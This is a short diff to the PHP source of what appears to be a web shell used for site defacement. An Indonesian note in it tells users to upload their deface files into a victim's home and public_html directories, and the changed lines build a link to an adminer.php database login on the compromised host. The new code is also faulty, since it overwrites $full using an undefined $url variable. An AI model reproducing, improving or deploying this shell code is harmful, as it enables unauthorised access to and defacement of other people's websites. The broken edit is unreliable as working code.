@@ -1301,7 +1301,8 @@ if($_GET['logout'] == true) {
 		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
 	}
 } elseif($_GET['do'] == 'adminer') {
-	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
+	$full = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+	$full = str_replace(basename($_SERVER['REQUEST_URI']), "", $url);
 	if(file_exists('adminer.php')) {
 		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 	} else {
